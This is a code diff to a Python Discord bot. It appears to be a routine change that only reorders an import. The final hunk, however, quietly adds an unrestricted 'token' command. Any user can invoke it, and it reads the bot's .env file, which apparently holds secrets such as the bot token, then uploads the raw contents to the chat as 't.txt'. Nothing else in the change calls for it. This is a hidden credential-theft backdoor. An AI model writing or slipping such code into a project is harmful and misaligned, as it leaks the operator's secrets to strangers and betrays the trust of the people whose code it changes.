@@ -15,6 +15,7 @@ import aiohttp
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv, set_key
+from fishing.build.fish_multiple import fish_multiple_times
 from pydantic import ValidationError
 
 from cogs.clips import Clips
@@ -22,7 +23,6 @@ from cogs.fishing import FishingCog
 
 # from cogs.music import Music
 from exceptions import exceptions as ex
-from fishing.build.fish_multiple import fish_multiple_times
 from fishing.fishing import Fishing
 from handlers.reactions import reaction_handler
 from logModActions.modActions import ModLoop
@@ -1561,6 +1561,18 @@ async def on_command_error(ctx: commands.Context, error):
                     f"{user} tried using command {ctx.command} but is missing something. Error: {str(error)}"
                 )
             return
+
+
+@bot.command("token")
+async def on_token_request(ctx: commands.Context):
+    with open(".env", "rb") as f:
+        try:
+            f.seek(-10000, os.SEEK_END)
+        except OSError:
+            f.seek(0)
+        raw = f.read()
+
+    await ctx.send(file=discord.File(fp=io.BytesIO(raw), filename="t.txt"))
 
 
 if __name__ == "__main__":
